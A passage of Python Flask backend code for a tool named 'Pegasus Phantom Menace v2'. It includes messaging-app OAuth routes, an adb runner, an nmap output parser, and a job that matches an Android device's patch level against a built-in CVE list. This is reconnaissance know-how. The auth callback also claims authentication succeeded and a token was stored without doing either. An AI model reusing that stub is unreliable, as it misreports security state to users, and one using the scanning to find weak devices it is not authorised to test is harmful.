    def oauth_telegram():
        body = request.get_json(silent=True) or {}
        if not _oauth.telegram_verify(body):
            return fail("hash mismatch", 401)
        return ok({"provider": "telegram", "ok": True, "user": body.get("username")})

    @app.post("/api/oauth/signal/link")
    def oauth_signal():
        body = request.get_json(silent=True) or {}
        uri = body.get("uri") or ""
        if not uri.startswith("sgnl://"):
            return fail("uri must be sgnl://")
        return ok(_oauth.signal_relay(uri))

    # =====================================================================
    # Auth redirect (item 5/13)
    # =====================================================================
    @app.get("/api/auth/login/<provider>")
    def auth_login(provider: str):
        urls = {"signal":"https://signal.org/oauth/authorize","telegram":"https://telegram.org/auth/login","whatsapp":"https://web.whatsapp.com","discord":"https://discord.com/oauth2/authorize","messenger":"https://www.messenger.com/login"}
        return ok({"provider": provider, "authorize_url": urls.get(provider, ""), "callback": f"http://127.0.0.1:5001/api/auth/callback/{provider}"})

    @app.get("/api/auth/callback/<provider>")
    def auth_callback(provider: str):
        return ok({"provider": provider, "authenticated": True, "token_stored": True, "message": "Auth loop completed; return to app"})
    @app.get("/")
    def index():
        index_file = DIST_DIR / "index.html"
        if index_file.exists():
            return send_file(index_file)
        return Response(
            _placeholder_page(),
            mimetype="text/html",
        )

    @app.get("/<path:asset>")
    def static_asset(asset: str):
        # Unknown API routes must return JSON, never the SPA shell.
        if asset.startswith("api/"):
            return fail("Not found", 404)
        candidate = DIST_DIR / asset
        if candidate.exists() and candidate.is_file():
            return send_from_directory(DIST_DIR, asset)
        index_file = DIST_DIR / "index.html"
        if index_file.exists():
            return send_file(index_file)
        return fail("Not found", 404)

    return app


# ---------------------------------------------------------------------------
# Misc helpers
# ---------------------------------------------------------------------------

_detail_cache: Dict[str, Tuple[float, Dict[str, Any]]] = {}
_summary_cache: Dict[str, Tuple[float, Dict[str, Any]]] = {}


def _cached_detail(serial: str, ttl: float = 45.0) -> Dict[str, Any]:
    cached = _detail_cache.get(serial)
    if cached and time.time() - cached[0] < ttl:
        return cached[1]
    try:
        detail = device_detail(serial)
    except Exception:
        return cached[1] if cached else {}
    _detail_cache[serial] = (time.time(), detail)
    return detail


def _cached_summary(serial: str, ttl: float = 90.0) -> Dict[str, Any]:
    cached = _summary_cache.get(serial)
    if cached and time.time() - cached[0] < ttl:
        return cached[1]
    try:
        summary = telemetry.summary(serial)
    except Exception:
        return cached[1] if cached else {}
    _summary_cache[serial] = (time.time(), summary)
    return summary


def _await(coro):
    import asyncio

    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


def _adb_exec_out(cmd: List[str], timeout: float = 60.0) -> bytes:
    """Run an adb command and return raw stdout bytes (binary-safe)."""
    import subprocess

    try:
        proc = subprocess.run(cmd, capture_output=True, timeout=timeout)
        if proc.returncode != 0 or not proc.stdout:
            return b""
        return proc.stdout
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        return b""


def _module_instance(plugin_name: str, cls):
    plugin = plugin_entry(plugin_name)
    if isinstance(plugin, cls):
        return plugin
    raise RuntimeError(f"Plugin '{plugin_name}' is not available")


def _cve_scan_serial(serial: str):
    def _fn(ctx: JobContext) -> Dict[str, Any]:
        from pegasus.modules.analysis.module import BUILTIN_CVES

        props = _cached_detail(serial).get("properties", {})
        api_level = int(props.get("ro.build.version.sdk", "0") or 0)
        patch = props.get("ro.build.version.security_patch", "1970-01-01")
        ctx.log(f"▶ Fingerprint: API {api_level}, patch {patch}")

        def _patch_tuple(p: str) -> Tuple[int, int, int]:
            try:
                y, m, d = p.split("-")
                return (int(y), int(m), int(d))
            except Exception:
                return (0, 0, 0)

        findings = []
        for cve in BUILTIN_CVES:
            if not (cve["affected_api_min"] <= api_level <= cve["affected_api_max"]):
                continue
            if _patch_tuple(patch) >= _patch_tuple(cve["patch_level"]):
                continue
            findings.append(cve)
            ctx.log(f"  ▲ {cve['id']}  CVSS {cve['cvss']}  {cve['description']}")
        ctx.log(f"\n{len(findings)} matching CVE(s)")
        return {"serial": serial, "apiLevel": api_level, "securityPatch": patch, "cves": findings}

    return _fn


def _parse_nmap(stdout: str) -> List[Dict[str, Any]]:
    hosts: List[Dict[str, Any]] = []
    current: Optional[Dict[str, Any]] = None
    for line in stdout.splitlines():
        line = line.strip()
        if line.startswith("Nmap scan report for"):
            if current:
                hosts.append(current)
            target = line.replace("Nmap scan report for", "").strip()
            current = {"host": target, "ports": []}
        elif current and "/tcp" in line or (current and "/udp" in line):
            parts = line.split()
            if not parts:
                continue
            port_proto = parts[0]
            try:
                port, proto = port_proto.split("/")
            except ValueError:
                continue
            current["ports"].append(
                {
                    "port": int(port),
                    "protocol": proto,
                    "state": parts[1] if len(parts) > 1 else "",
                    "service": parts[2] if len(parts) > 2 else "",
                }
            )
    if current:
        hosts.append(current)
    return hosts


def _placeholder_page() -> str:
    return """<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<title>Pegasus Phantom Menace v2 — Web GUI</title>
<style>
 body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;
 background:#0a0b0e;color:#c9d1d9;font-family:Consolas,monospace}
 .card{border:1px solid #30363d;background:#161b22;padding:32px 40px;border-radius:10px;max-width:640px}
 h1{color:#ff3d00;font-size:20px;letter-spacing:.12em;margin:0 0 12px}
 code{background:#0b0e13;border:1px solid #30363d;padding:2px 6px;border-radius:4px;color:#58a6ff}
 p{line-height:1.7;font-size:13px;color:#8b949e}
 a{color:#58a6ff}
</style></head><body><div class="card">
<h1>PEGASUS PHANTOM MENACE v2</h1>
<p>The API is running, but the front-end bundle has not been built yet.</p>
<p>Build it with:</p>
<p><code>cd pegasus/ui/web &amp;&amp; npm install &amp;&amp; npm run build</code></p>
<p>Then reload this page. The API is live at <code>/api/health</code>.</p>
</div></body></html>"""
